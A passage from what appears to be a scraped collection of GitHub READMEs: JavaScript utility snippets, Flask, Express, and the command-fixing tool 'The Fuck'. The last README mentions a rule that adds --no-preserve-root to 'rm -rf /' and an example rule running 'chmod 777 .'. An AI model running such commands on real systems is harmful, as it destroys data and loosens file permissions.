callback the responseText.\nHandle the onerror event, by running the provided err function.\nOmit the third argument, err, to log errors to the console's error stream by default.\nconst httpGet = (url, callback, err = console.error) => {\n  const request = new XMLHttpRequest();\n  request.open('GET', url, true);\n  request.onload = () => callback(request.responseText);\n  request.onerror = () => err(request);\n  request.send();\n};\n\nExamples\nhttpGet(\n  'https://jsonplaceholder.typicode.com/posts/1',\n  console.log\n); /*\nLogs: {\n  \"userId\": 1,\n  \"id\": 1,\n  \"title\": \"sunt aut facere repellat provident occaecati excepturi optio reprehenderit\",\n  \"body\": \"quia et suscipit\\nsuscipit recusandae consequuntur expedita et cum\\nreprehenderit molestiae ut ut quas totam\\nnostrum rerum est autem sunt rem eveniet architecto\"\n}\n*/\n\n\u2b06 Back to top\nhttpPost\nMakes a POST request to the passed URL.\nUse XMLHttpRequest web api to make a post request to the given url.\nSet the value of an HTTP request header with setRequestHeader method.\nHandle the onload event, by calling the given callback the responseText.\nHandle the onerror event, by running the provided err function.\nOmit the third argument, data, to send no data to the provided url.\nOmit the fourth argument, err, to log errors to the console's error stream by default.\nconst httpPost = (url, data, callback, err = console.error) => {\n  const request = new XMLHttpRequest();\n  request.open('POST', url, true);\n  request.setRequestHeader('Content-type', 'application/json; charset=utf-8');\n  request.onload = () => callback(request.responseText);\n  request.onerror = () => err(request);\n  request.send(data);\n};\n\nExamples\nconst newPost = {\n  userId: 1,\n  id: 1337,\n  title: 'Foo',\n  body: 'bar bar bar'\n};\nconst data = JSON.stringify(newPost);\nhttpPost(\n  'https://jsonplaceholder.typicode.com/posts',\n  data,\n  console.log\n); /*\nLogs: {\n  \"userId\": 1,\n  \"id\": 1337,\n  \"title\": \"Foo\",\n  \"body\": \"bar bar bar\"\n}\n*/\nhttpPost(\n  'https://jsonplaceholder.typicode.com/posts',\n  null, // does not send a body\n  console.log\n); /*\nLogs: {\n  \"id\": 101\n}\n*/\n\n\u2b06 Back to top\nisBrowser\nDetermines if the current runtime environment is a browser so that front-end modules can run on the server (Node) without throwing errors.\nUse Array.prototype.includes() on the typeof values of both window and document (globals usually only available in a browser environment unless they were explicitly defined), which will return true if one of them is undefined.\ntypeof allows globals to be checked for existence without throwing a ReferenceError.\nIf both of them are not undefined, then the current environment is assumed to be a browser.\nconst isBrowser = () => ![typeof window, typeof document].includes('undefined');\n\nExamples\nisBrowser(); // true (browser)\nisBrowser(); // false (Node)\n\n\u2b06 Back to top\nmostPerformant\nReturns the index of the function in an array of functions which executed the fastest.\nUse Array.prototype.map() to generate an array where each value is the total time taken to execute the function after iterations times. Use the difference in performance.now() values before and after to get the total time in milliseconds to a high degree of accuracy.\nUse Math.min() to find the minimum execution time, and return the index of that shortest time which corresponds to the index of the most performant function.\nOmit the second argument, iterations, to use a default of 10,000 iterations. The more iterations, the more reliable the result but the longer it will take.\nconst mostPerformant = (fns, iterations = 10000) => {\n  const times = fns.map(fn => {\n    const before = performance.now();\n    for (let i = 0; i < iterations; i++) fn();\n    return performance.now() - before;\n  });\n  return times.indexOf(Math.min(...times));\n};\n\nExamples\nmostPerformant([\n  () => {\n    // Loops through the entire array before returning `false`\n    [1, 2, 3, 4, 5, 6, 7, 8, 9, '10'].every(el => typeof el === 'number');\n  },\n  () => {\n    // Only needs to reach index `1` before returning false\n    [1, '2', 3, 4, 5, 6, 7, 8, 9, 10].every(el => typeof el === 'number');\n  }\n]); // 1\n\n\u2b06 Back to top\nnthArg\nCreates a function that gets the argument at index n. If n is negative, the nth argument from the end is returned.\nUse Array.prototype.slice() to get the desired argument at index n.\nconst nthArg = n => (...args) => args.slice(n)[0];\n\nExamples\nconst third = nthArg(2);\nthird(1, 2, 3); // 3\nthird(1, 2); // undefined\nconst last = nthArg(-1);\nlast(1, 2, 3, 4, 5); // 5\n\n\u2b06 Back to top\nparseCookie\nParse an HTTP Cookie header string and return an object of all cookie name-value pairs.\nUse String.prototype.split(';') to separate key-value pairs from each other.\nUse Array.prototype.map() and String.prototype.split('=') to separate keys from values in each pair.\nUse Array.prototype.reduce() and decodeURIComponent() to create an object with all key-value pairs.\nconst parseCookie = str =>\n  str\n    .split(';')\n    .map(v => v.split('='))\n    .reduce((acc, v) => {\n      acc[decodeURIComponent(v[0].trim())] = decodeURIComponent(v[1].trim());\n      return acc;\n    }, {});\n\nExamples\nparseCookie('foo=bar; equation=E%3Dmc%5E2'); // { foo: 'bar', equation: 'E=mc^2' }\n\n\u2b06 Back to top\nprettyBytes \nConverts a number in bytes to a human-readable string.\nUse an array dictionary of units to be accessed based on the exponent.\nUse Number.toPrecision() to truncate the number to a certain number of digits.\nReturn the prettified string by building it up, taking into account the supplied options and whether it is negative or not.\nOmit the second argument, precision, to use a default precision of 3 digits.\nOmit the third argument, addSpace, to add space between the number and unit by default.\nconst prettyBytes = (num, precision = 3, addSpace = true) => {\n  const UNITS = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];\n  if (Math.abs(num) < 1) return num + (addSpace ? ' ' : '') + UNITS[0];\n  const exponent = Math.min(Math.floor(Math.log10(num < 0 ? -num : num) / 3), UNITS.length - 1);\n  const n = Number(((num < 0 ? -num : num) / 1000 ** exponent).toPrecision(precision));\n  return (num < 0 ? '-' : '') + n + (addSpace ? ' ' : '') + UNITS[exponent];\n};\n\nExamples\nprettyBytes(1000); // \"1 KB\"\nprettyBytes(-27145424323.5821, 5); // \"-27.145 GB\"\nprettyBytes(123456789, 3, false); // \"123MB\"\n\n\u2b06 Back to top\nrandomHexColorCode\nGenerates a random hexadecimal color code.\nUse Math.random to generate a random 24-bit(6x4bits) hexadecimal number. Use bit shifting and then convert it to an hexadecimal String using toString(16).\nconst randomHexColorCode = () => {\n  let n = (Math.random() * 0xfffff * 1000000).toString(16);\n  return '#' + n.slice(0, 6);\n};\n\nExamples\nrandomHexColorCode(); // \"#e34155\"\n\n\u2b06 Back to top\nRGBToHex\nConverts the values of RGB components to a color code.\nConvert given RGB parameters to hexadecimal string using bitwise left-shift operator (<<) and toString(16), then String.padStart(6,'0') to get a 6-digit hexadecimal value.\nconst RGBToHex = (r, g, b) => ((r << 16) + (g << 8) + b).toString(16).padStart(6, '0');\n\nExamples\nRGBToHex(255, 165, 1); // 'ffa501'\n\n\u2b06 Back to top\nserializeCookie\nSerialize a cookie name-value pair into a Set-Cookie header string.\nUse template literals and encodeURIComponent() to create the appropriate string.\nconst serializeCookie = (name, val) => `${encodeURIComponent(name)}=${encodeURIComponent(val)}`;\n\nExamples\nserializeCookie('foo', 'bar'); // 'foo=bar'\n\n\u2b06 Back to top\ntimeTaken\nMeasures the time taken by a function to execute.\nUse console.time() and console.timeEnd() to measure the difference between the start and end times to determine how long the callback took to execute.\nconst timeTaken = callback => {\n  console.time('timeTaken');\n  const r = callback();\n  console.timeEnd('timeTaken');\n  return r;\n};\n\nExamples\ntimeTaken(() => Math.pow(2, 10)); // 1024, (logged): timeTaken: 0.02099609375ms\n\n\u2b06 Back to top\ntoCurrency\nTake a number and return specified currency formatting.\nUse Intl.NumberFormat to enable country / currency sensitive formatting.\nconst toCurrency = (n, curr, LanguageFormat = undefined) =>\n  Intl.NumberFormat(LanguageFormat, { style: 'currency', currency: curr }).format(n);\n\nExamples\ntoCurrency(123456.789, 'EUR'); // \u20ac123,456.79  | currency: Euro | currencyLangFormat: Local\ntoCurrency(123456.789, 'USD', 'en-us'); // $123,456.79  | currency: US Dollar | currencyLangFormat: English (United States)\ntoCurrency(123456.789, 'USD', 'fa'); // \u06f1\u06f2\u06f3\u066c\u06f4\u06f5\u06f6\u066b\u06f7\u06f9 \u061c$ | currency: US Dollar | currencyLangFormat: Farsi\ntoCurrency(322342436423.2435, 'JPY'); // \u00a5322,342,436,423 | currency: Japanese Yen | currencyLangFormat: Local\ntoCurrency(322342436423.2435, 'JPY', 'fi'); // 322 342 436 423 \u00a5 | currency: Japanese Yen | currencyLangFormat: Finnish\n\n\u2b06 Back to top\ntoDecimalMark\nUse toLocaleString() to convert a float-point arithmetic to the Decimal mark form. It makes a comma separated string from a number.\nconst toDecimalMark = num => num.toLocaleString('en-US');\n\nExamples\ntoDecimalMark(12305030388.9087); // \"12,305,030,388.909\"\n\n\u2b06 Back to top\ntoOrdinalSuffix\nAdds an ordinal suffix to a number.\nUse the modulo operator (%) to find values of single and tens digits.\nFind which ordinal pattern digits match.\nIf digit is found in teens pattern, use teens ordinal.\nconst toOrdinalSuffix = num => {\n  const int = parseInt(num),\n    digits = [int % 10, int % 100],\n    ordinals = ['st', 'nd', 'rd', 'th'],\n    oPattern = [1, 2, 3, 4],\n    tPattern = [11, 12, 13, 14, 15, 16, 17, 18, 19];\n  return oPattern.includes(digits[0]) && !tPattern.includes(digits[1])\n    ? int + ordinals[digits[0] - 1]\n    : int + ordinals[3];\n};\n\nExamples\ntoOrdinalSuffix('123'); // \"123rd\"\n\n\u2b06 Back to top\nvalidateNumber\nReturns true if the given value is a number, false otherwise.\nUse !isNaN() in combination with parseFloat() to check if the argument is a number.\nUse isFinite() to check if the number is finite.\nUse Number() to check if the coercion holds.\nconst validateNumber = n => !isNaN(parseFloat(n)) && isFinite(n) && Number(n) == n;\n\nExamples\nvalidateNumber('10'); // true\n\n\u2b06 Back to top\nyesNo\nReturns true if the string is y/yes or false if the string is n/no.\nUse RegExp.test() to check if the string evaluates to y/yes or n/no.\nOmit the second argument, def to set the default answer as no.\nconst yesNo = (val, def = false) =>\n  /^(y|yes)$/i.test(val) ? true : /^(n|no)$/i.test(val) ? false : def;\n\nExamples\nyesNo('Y'); // true\nyesNo('yes'); // true\nyesNo('No'); // false\nyesNo('Foo', true); // true\n\n\u2b06 Back to top\nCollaborators\n\n\n\n Angelos Chalaris\n Felix Wu\n Stefan Feje\u0161\n King David Martins\n Soorena Soleimani\n\n\n\n\n Elder Henrique Souza\n Robert Mennell\n atomiks\n\n\n\n\n\nCredits\nLogos made by Angelos Chalaris are licensed under the MIT license.\nThis README is built using markdown-builder."}, {"title": "pallets/flask", "language": "Python", "content": "Flask\nFlask is a lightweight WSGI web application framework. It is designed\nto make getting started quick and easy, with the ability to scale up to\ncomplex applications. It began as a simple wrapper around Werkzeug\nand Jinja and has become one of the most popular Python web\napplication frameworks.\nFlask offers suggestions, but doesn't enforce any dependencies or\nproject layout. It is up to the developer to choose the tools and\nlibraries they want to use. There are many extensions provided by the\ncommunity that make adding new functionality easy.\n\nInstalling\nInstall and update using pip:\npip install -U Flask\n\n\nA Simple Example\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello():\n    return 'Hello, World!'\n$ env FLASK_APP=hello.py flask run\n * Serving Flask app \"hello\"\n * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)\n\n\nContributing\nFor guidance on setting up a development environment and how to make a\ncontribution to Flask, see the contributing guidelines.\n\nDonate\nThe Pallets organization develops and supports Flask and the libraries\nit uses. In order to grow the community of contributors and users, and\nallow the maintainers to devote more time to the projects, please\ndonate today.\n\nLinks\n\nWebsite: https://www.palletsprojects.com/p/flask/\nDocumentation: http://flask.pocoo.org/docs/\nLicense: BSD\nReleases: https://pypi.org/project/Flask/\nCode: https://github.com/pallets/flask\nIssue tracker: https://github.com/pallets/flask/issues\nTest status:\nLinux, Mac: https://travis-ci.org/pallets/flask\nWindows: https://ci.appveyor.com/project/pallets/flask\n\n\nTest coverage: https://codecov.io/gh/pallets/flask"}, {"title": "expressjs/express", "language": "JavaScript", "content": "Fast, unopinionated, minimalist web framework for node.\n\n\n\n\n\nvar express = require('express')\nvar app = express()\n\napp.get('/', function (req, res) {\n  res.send('Hello World')\n})\n\napp.listen(3000)\nInstallation\nThis is a Node.js module available through the\nnpm registry.\nBefore installing, download and install Node.js.\nNode.js 0.10 or higher is required.\nInstallation is done using the\nnpm install command:\n$ npm install express\nFollow our installing guide\nfor more information.\nFeatures\n\nRobust routing\nFocus on high performance\nSuper-high test coverage\nHTTP helpers (redirection, caching, etc)\nView system supporting 14+ template engines\nContent negotiation\nExecutable for generating applications quickly\n\nDocs & Community\n\nWebsite and Documentation - [website repo]\n#express on freenode IRC\nGitHub Organization for Official Middleware & Modules\nVisit the Wiki\nGoogle Group for discussion\nGitter for support and discussion\n\nPROTIP Be sure to read Migrating from 3.x to 4.x as well as New features in 4.x.\nSecurity Issues\nIf you discover a security vulnerability in Express, please see Security Policies and Procedures.\nQuick Start\nThe quickest way to get started with express is to utilize the executable express(1) to generate an application as shown below:\nInstall the executable. The executable's major version will match Express's:\n$ npm install -g express-generator@4\nCreate the app:\n$ express /tmp/foo && cd /tmp/foo\nInstall dependencies:\n$ npm install\nStart the server:\n$ npm start\nPhilosophy\nThe Express philosophy is to provide small, robust tooling for HTTP servers, making\nit a great solution for single page applications, web sites, hybrids, or public\nHTTP APIs.\nExpress does not force you to use any specific ORM or template engine. With support for over\n14 template engines via Consolidate.js,\nyou can quickly craft your perfect framework.\nExamples\nTo view the examples, clone the Express repo and install the dependencies:\n$ git clone git://github.com/expressjs/express.git --depth 1\n$ cd express\n$ npm install\nThen run whichever example you want:\n$ node examples/content-negotiation\nTests\nTo run the test suite, first install the dependencies, then run npm test:\n$ npm install\n$ npm test\nPeople\nThe original author of Express is TJ Holowaychuk\nThe current lead maintainer is Douglas Christopher Wilson\nList of all contributors\nLicense\nMIT"}, {"title": "nvbn/thefuck", "language": "Python", "content": "The Fuck     \nThe Fuck is a magnificent app, inspired by a @liamosaur\ntweet,\nthat corrects errors in previous console commands.\nIs The Fuck too slow? Try the experimental instant mode!\n\nMore examples:\n\u279c apt-get install vim\nE: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)\nE: Unable to lock the administration directory (/var/lib/dpkg/), are you root?\n\n\u279c fuck\nsudo apt-get install vim [enter/\u2191/\u2193/ctrl+c]\n[sudo] password for nvbn:\nReading package lists... Done\n...\n\u279c git push\nfatal: The current branch master has no upstream branch.\nTo push the current branch and set the remote as upstream, use\n\n    git push --set-upstream origin master\n\n\n\u279c fuck\ngit push --set-upstream origin master [enter/\u2191/\u2193/ctrl+c]\nCounting objects: 9, done.\n...\n\u279c puthon\nNo command 'puthon' found, did you mean:\n Command 'python' from package 'python-minimal' (main)\n Command 'python' from package 'python3' (main)\nzsh: command not found: puthon\n\n\u279c fuck\npython [enter/\u2191/\u2193/ctrl+c]\nPython 3.4.2 (default, Oct  8 2014, 13:08:17)\n...\n\u279c git brnch\ngit: 'brnch' is not a git command. See 'git --help'.\n\nDid you mean this?\n    branch\n\n\u279c fuck\ngit branch [enter/\u2191/\u2193/ctrl+c]\n* master\n\u279c lein rpl\n'rpl' is not a task. See 'lein help'.\n\nDid you mean this?\n         repl\n\n\u279c fuck\nlein repl [enter/\u2191/\u2193/ctrl+c]\nnREPL server started on port 54848 on host 127.0.0.1 - nrepl://127.0.0.1:54848\nREPL-y 0.3.1\n...\nIf you're not afraid of blindly running corrected commands, the\nrequire_confirmation settings option can be disabled:\n\u279c apt-get install vim\nE: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)\nE: Unable to lock the administration directory (/var/lib/dpkg/), are you root?\n\n\u279c fuck\nsudo apt-get install vim\n[sudo] password for nvbn:\nReading package lists... Done\n...\nRequirements\n\npython (3.4+)\npip\npython-dev\n\nInstallation\nOn OS X, you can install The Fuck via Homebrew (or via Linuxbrew on Linux):\nbrew install thefuck\nOn Ubuntu / Mint, install The Fuck with the following commands:\nsudo apt update\nsudo apt install python3-dev python3-pip python3-setuptools\nsudo pip3 install thefuck\nOn FreeBSD, install The Fuck with the following commands:\npkg install thefuck\nOn ChromeOS, install The Fuck using chromebrew with the following command:\ncrew install thefuck\nOn other systems, install The Fuck  by using pip:\npip install thefuck\nAlternatively, you may use an OS package manager (OS X, Ubuntu, Arch).\n#\nIt is recommended that you place this command in your .bash_profile,\n.bashrc, .zshrc or other startup script:\neval $(thefuck --alias)\n# You can use whatever you want as an alias, like for Mondays:\neval $(thefuck --alias FUCK)\nOr in your shell config (Bash, Zsh, Fish, Powershell, tcsh).\nChanges are only available in a new shell session. To make changes immediately\navailable, run source ~/.bashrc (or your shell config file like .zshrc).\nTo run fixed commands without confirmation, use the --yeah option (or just -y for short):\nfuck --yeah\nTo fix commands recursively until succeeding, use the -r option:\nfuck -r\nUpdating\npip3 install thefuck --upgrade\nNote: Alias functionality was changed in v1.34 of The Fuck\nHow it works\nThe Fuck attempts to match the previous command with a rule. If a match is\nfound, a new command is created using the matched rule and executed. The\nfollowing rules are enabled by default:\n\nadb_unknown_command \u2013 fixes misspelled commands like adb logcta;\nag_literal \u2013 adds -Q to ag when suggested;\naws_cli \u2013 fixes misspelled commands like aws dynamdb scan;\naz_cli \u2013 fixes misspelled commands like az providers;\ncargo \u2013 runs cargo build instead of cargo;\ncargo_no_command \u2013 fixes wrongs commands like cargo buid;\ncat_dir \u2013 replaces cat with ls when you try to cat a directory;\ncd_correction \u2013 spellchecks and correct failed cd commands;\ncd_mkdir \u2013 creates directories before cd'ing into them;\ncd_parent \u2013 changes cd.. to cd ..;\nchmod_x \u2013 add execution bit;\ncomposer_not_command \u2013 fixes composer command name;\ncp_omitting_directory \u2013 adds -a when you cp directory;\ncpp11 \u2013 adds missing -std=c++11 to g++ or clang++;\ndirty_untar \u2013 fixes tar x command that untarred in the current directory;\ndirty_unzip \u2013 fixes unzip command that unzipped in the current directory;\ndjango_south_ghost \u2013 adds --delete-ghost-migrations to failed because ghosts django south migration;\ndjango_south_merge \u2013 adds --merge to inconsistent django south migration;\ndocker_login \u2013 executes a docker login and repeats the previous command;\ndocker_not_command \u2013 fixes wrong docker commands like docker tags;\ndry \u2013 fixes repetitions like git git push;\nfab_command_not_found \u2013 fix misspelled fabric commands;\nfix_alt_space \u2013 replaces Alt+Space with Space character;\nfix_file \u2013 opens a file with an error in your $EDITOR;\ngem_unknown_command \u2013 fixes wrong gem commands;\ngit_add \u2013 fixes \"pathspec 'foo' did not match any file(s) known to git.\";\ngit_add_force \u2013 adds --force to git add <pathspec>... when paths are .gitignore'd;\ngit_bisect_usage \u2013 fixes git bisect strt, git bisect goood, git bisect rset, etc. when bisecting;\ngit_branch_delete \u2013 changes git branch -d to git branch -D;\ngit_branch_exists \u2013 offers git branch -d foo, git branch -D foo or git checkout foo when creating a branch that already exists;\ngit_branch_list \u2013 catches git branch list in place of git branch and removes created branch;\ngit_checkout \u2013 fixes branch name or creates new branch;\ngit_commit_amend \u2013 offers git commit --amend after previous commit;\ngit_commit_reset \u2013 offers git reset HEAD~ after previous commit;\ngit_diff_no_index \u2013 adds --no-index to previous git diff on untracked files;\ngit_diff_staged \u2013 adds --staged to previous git diff with unexpected output;\ngit_fix_stash \u2013 fixes git stash commands (misspelled subcommand and missing save);\ngit_flag_after_filename \u2013 fixes fatal: bad flag '...' after filename\ngit_help_aliased \u2013 fixes git help <alias> commands replacing  with the aliased command;\ngit_merge \u2013 adds remote to branch names;\ngit_merge_unrelated \u2013 adds --allow-unrelated-histories when required\ngit_not_command \u2013 fixes wrong git commands like git brnch;\ngit_pull \u2013 sets upstream before executing previous git pull;\ngit_pull_clone \u2013 clones instead of pulling when the repo does not exist;\ngit_pull_uncommitted_changes \u2013 stashes changes before pulling and pops them afterwards;\ngit_push \u2013 adds --set-upstream origin $branch to previous failed git push;\ngit_push_different_branch_names \u2013 fixes pushes when local brach name does not match remote branch name;\ngit_push_pull \u2013 runs git pull when push was rejected;\ngit_push_without_commits \u2013 Creates an initial commit if you forget and only git add ., when setting up a new project;\ngit_rebase_no_changes \u2013 runs git rebase --skip instead of git rebase --continue when there are no changes;\ngit_remote_delete \u2013 replaces git remote delete remote_name with git remote remove remote_name;\ngit_rm_local_modifications \u2013  adds -f or --cached when you try to rm a locally modified file;\ngit_rm_recursive \u2013 adds -r when you try to rm a directory;\ngit_rm_staged \u2013  adds -f or --cached when you try to rm a file with staged changes\ngit_rebase_merge_dir \u2013 offers git rebase (--continue | --abort | --skip) or removing the .git/rebase-merge dir when a rebase is in progress;\ngit_remote_seturl_add \u2013 runs git remote add when git remote set_url on nonexistant remote;\ngit_stash \u2013 stashes your local modifications before rebasing or switching branch;\ngit_stash_pop \u2013 adds your local modifications before popping stash, then resets;\ngit_tag_force \u2013 adds --force to git tag <tagname> when the tag already exists;\ngit_two_dashes \u2013 adds a missing dash to commands like git commit -amend or git rebase -continue;\ngo_run \u2013 appends .go extension when compiling/running Go programs;\ngradle_no_task \u2013 fixes not found or ambiguous gradle task;\ngradle_wrapper \u2013 replaces gradle with ./gradlew;\ngrep_arguments_order \u2013 fixes grep arguments order for situations like grep -lir . test;\ngrep_recursive \u2013 adds -r when you try to grep directory;\ngrunt_task_not_found \u2013 fixes misspelled grunt commands;\ngulp_not_task \u2013 fixes misspelled gulp tasks;\nhas_exists_script \u2013 prepends ./ when script/binary exists;\nheroku_multiple_apps \u2013 add --app <app> to heroku commands like heroku pg;\nheroku_not_command \u2013 fixes wrong heroku commands like heroku log;\nhistory \u2013 tries to replace command with most similar command from history;\nhostscli \u2013 tries to fix hostscli usage;\nifconfig_device_not_found \u2013 fixes wrong device names like wlan0 to wlp2s0;\njava \u2013 removes .java extension when running Java programs;\njavac \u2013 appends missing .java when compiling Java files;\nlein_not_task \u2013 fixes wrong lein tasks like lein rpl;\nlong_form_help \u2013 changes -h to --help when the short form version is not supported\nln_no_hard_link \u2013 catches hard link creation on directories, suggest symbolic link;\nln_s_order \u2013 fixes ln -s arguments order;\nls_all \u2013 adds -A to ls when output is empty;\nls_lah \u2013 adds -lah to ls;\nman \u2013 changes manual section;\nman_no_space \u2013 fixes man commands without spaces, for example mandiff;\nmercurial \u2013 fixes wrong hg commands;\nmissing_space_before_subcommand \u2013 fixes command with missing space like npminstall;\nmkdir_p \u2013 adds -p when you try to create a directory without parent;\nmvn_no_command \u2013 adds clean package to mvn;\nmvn_unknown_lifecycle_phase \u2013 fixes misspelled lifecycle phases with mvn;\nnpm_missing_script \u2013 fixes npm custom script name in npm run-script <script>;\nnpm_run_script \u2013 adds missing run-script for custom npm scripts;\nnpm_wrong_command \u2013 fixes wrong npm commands like npm urgrade;\nno_command \u2013 fixes wrong console commands, for example vom/vim;\nno_such_file \u2013 creates missing directories with mv and cp commands;\nopen \u2013 either prepends http:// to address passed to open or create a new file or directory and passes it to open;\npip_install \u2013 fixes permission issues with pip install commands by adding --user or prepending sudo if necessary;\npip_unknown_command \u2013 fixes wrong pip commands, for example pip instatl/pip install;\nphp_s \u2013 replaces -s by -S when trying to run a local php server;\nport_already_in_use \u2013 kills process that bound port;\nprove_recursively \u2013 adds -r when called with directory;\npython_command \u2013 prepends python when you try to run non-executable/without ./ python script;\npython_execute \u2013 appends missing .py when executing Python files;\nquotation_marks \u2013 fixes uneven usage of ' and \" when containing args';\npath_from_history \u2013 replaces not found path with similar absolute path from history;\nreact_native_command_unrecognized \u2013 fixes unrecognized react-native commands;\nremove_trailing_cedilla \u2013 remove trailling cedillas \u00e7, a common typo for european keyboard layouts;\nrm_dir \u2013 adds -rf when you try to remove a directory;\nscm_correction \u2013 corrects wrong scm like hg log to git log;\nsed_unterminated_s \u2013 adds missing '/' to sed's s commands;\nsl_ls \u2013 changes sl to ls;\nssh_known_hosts \u2013 removes host from known_hosts on warning;\nsudo \u2013 prepends sudo to previous command if it failed because of permissions;\nsudo_command_from_user_path \u2013 runs commands from users $PATH with sudo;\nswitch_lang \u2013 switches command from your local layout to en;\nsystemctl \u2013 correctly orders parameters of confusing systemctl;\ntest.py \u2013 runs py.test instead of test.py;\ntouch \u2013 creates missing directories before \"touching\";\ntsuru_login \u2013 runs tsuru login if not authenticated or session expired;\ntsuru_not_command \u2013 fixes wrong tsuru commands like tsuru shell;\ntmux \u2013 fixes tmux commands;\nunknown_command \u2013 fixes hadoop hdfs-style \"unknown command\", for example adds missing '-' to the command on hdfs dfs ls;\nunsudo \u2013 removes sudo from previous command if a process refuses to run on super user privilege.\nvagrant_up \u2013 starts up the vagrant instance;\nwhois \u2013 fixes whois command;\nworkon_doesnt_exists \u2013 fixes virtualenvwrapper env name os suggests to create new.\nyarn_alias \u2013 fixes aliased yarn commands like yarn ls;\nyarn_command_not_found \u2013 fixes misspelled yarn commands;\nyarn_command_replaced \u2013 fixes replaced yarn commands;\nyarn_help \u2013 makes it easier to open yarn documentation;\n\nThe following rules are enabled by default on specific platforms only:\n\napt_get \u2013 installs app from apt if it not installed (requires python-commandnotfound / python3-commandnotfound);\napt_get_search \u2013 changes trying to search using apt-get with searching using apt-cache;\napt_invalid_operation \u2013 fixes invalid apt and apt-get calls, like apt-get isntall vim;\napt_list_upgradable \u2013 helps you run apt list --upgradable after apt update;\napt_upgrade \u2013 helps you run apt upgrade after apt list --upgradable;\nbrew_cask_dependency \u2013 installs cask dependencies;\nbrew_install \u2013 fixes formula name for brew install;\nbrew_reinstall \u2013 turns brew install <formula> into brew reinstall <formula>;\nbrew_link \u2013 adds --overwrite --dry-run if linking fails;\nbrew_uninstall \u2013 adds --force to brew uninstall if multiple versions were installed;\nbrew_unknown_command \u2013 fixes wrong brew commands, for example brew docto/brew doctor;\nbrew_update_formula \u2013 turns brew update <formula> into brew upgrade <formula>;\ndnf_no_such_command \u2013 fixes mistyped DNF commands;\npacman \u2013 installs app with pacman if it is not installed (uses yaourt if available);\npacman_not_found \u2013 fixes package name with pacman or yaourt.\n\nThe following commands are bundled with The Fuck, but are not enabled by\ndefault:\n\ngit_push_force \u2013 adds --force-with-lease to a git push (may conflict with git_push_pull);\nrm_root \u2013 adds --no-preserve-root to rm -rf / command.\n\nCreating your own rules\nTo add your own rule, create a file named your-rule-name.py\nin ~/.config/thefuck/rules. The rule file must contain two functions:\nmatch(command: Command) -> bool\nget_new_command(command: Command) -> str | list[str]\nAdditionally, rules can contain optional functions:\nside_effect(old_command: Command, fixed_command: str) -> None\nRules can also contain the optional variables enabled_by_default, requires_output and priority.\nCommand has three attributes: script, output and script_parts.\nYour rule should not change Command.\nRules api changed in 3.0: To access a rule's settings, import it with\nfrom thefuck.conf import settings\nsettings is a special object assembled from ~/.config/thefuck/settings.py,\nand values from env (see more below).\nA simple example rule for running a script with sudo:\ndef match(command):\n    return ('permission denied' in command.output.lower()\n            or 'EACCES' in command.output)\n\n\ndef get_new_command(command):\n    return 'sudo {}'.format(command.script)\n\n# Optional:\nenabled_by_default = True\n\ndef side_effect(command, fixed_command):\n    subprocess.call('chmod 777 .', shell=True)\n\npriority = 1000  # Lower first, default is 1000\n\nrequires_output = True\nMore examples of rules,\nutility functions for rules,\napp/os-specific helpers.\nSettings\nSeveral The Fuck parameters can be changed in the file $XDG_CONFIG_HOME/thefuck/settings.py\n($XDG_CONFIG_HOME defaults to ~/.config):\n\nrules \u2013 list of enabled rules, by default thefuck.conf.DEFAULT_RULES;\nexclude_rules \u2013 list of disabled rules, by default [];\nrequire_confirmation \u2013 requires confirmation before running new command, by default True;\nwait_command \u2013 max amount of time in seconds for getting previous command output;\nno_colors \u2013 disable colored output;\npriority \u2013 dict with rules priorities, rule with lower priority will be matched first;\ndebug \u2013 enables debug output, by default False;\nhistory_limit \u2013 numeric value of how many history commands will be scanned, like 2000;\nalter_history \u2013 push fixed command to history, by default True;\nwait_slow_command \u2013 max amount of time in seconds for getting previous command output if it in slow_commands list;\nslow_commands \u2013 list of slow commands;\nnum_close_matches \u2013 maximum number of close matches to suggest, by default 3.\n\nAn example of settings.py:\nrules = ['sudo', 'no_command']\nexclude_rules = ['git_push']\nrequire_confirmation = True\nwait_command = 10\nno_colors = False\npriority = {'sudo': 100, 'no_command': 9999}\ndebug = False\nhistory_limit = 9999\nwait_slow_command = 20\nslow_commands = ['react-native', 'gradle']\nnum_close_matches = 5\nOr via environment variables:\n\nTHEFUCK_RULES \u2013 list of enabled rules, like DEFAULT_RULES:rm_root or sudo:no_command;\nTHEFUCK_EXCLUDE_RULES \u2013 list of disabled rules, like git_pull:git_push;\nTHEFUCK_REQUIRE_CONFIRMATION \u2013 require confirmation before running new command, true/false;\nTHEFUCK_WAIT_COMMAND \u2013 max amount of time in seconds for getting previous command output;\nTHEFUCK_NO_COLORS \u2013 disable colored output, true/false;\nTHEFUCK_PRIORITY \u2013 priority of the rules, like no_command=9999:apt_get=100,\nrule with lower priority will be matched first;\nTHEFUCK_DEBUG \u2013 enables debug output, true/false;\nTHEFUCK_HISTORY_LIMIT \u2013 how many history commands will be scanned, like 2000;\nTHEFUCK_ALTER_HISTORY \u2013 push fixed command to history true/false;\nTHEFUCK_WAIT_SLOW_COMMAND \u2013 max amount of time in seconds for getting previous command output if it in slow_commands list;\nTHEFUCK_SLOW_COMMANDS \u2013 list of slow commands, like lein:gradle;\nTHEFUCK_NUM_CLOSE_MATCHES \u2013 maximum number of close matches to suggest, like 5.\n\nFor example:\nexport THEFUCK_RULES='sudo:no_command'\nexport THEFUCK_EXCLUDE_RULES='git_pull:git_push'\nexport THEFUCK_REQUIRE_CONFIRMATION='true'\nexport THEFUCK_WAIT_COMMAND=10\nexport THEFUCK_NO_COLORS='false'\nexport THEFUCK_PRIORITY='no_command=9999:apt_get=100'\nexport THEFUCK_HISTORY_LIMIT='2000'\nexport THEFUCK_NUM_CLOSE_MATCHES='5'\nThird-party packages with rules\nIf you'd like to make a specific set of non-public rules, but would still like\nto share them with others, create a package named thefuck_contrib_* with\nthe following structure:\nthefuck_contrib_foo\n  thefuck_contrib_foo\n    rules\n      __init__.py\n      *third-party rules*\n    __init__.py\n    *third-party-utils*\n  setup.py\n\nThe Fuck will find rules located in the rules module.\nExperimental instant mode\nThe default behavior of The Fuck requires time to re-run previous commands.\nWhen in instant mode, The Fuck saves time by logging output with script,\nthen reading the log.\n\nCurrently, instant mode only supports Python 3 with bash or zsh. zsh's autocorrect function also needs to be disabled in order for thefuck to work properly.\nTo enable 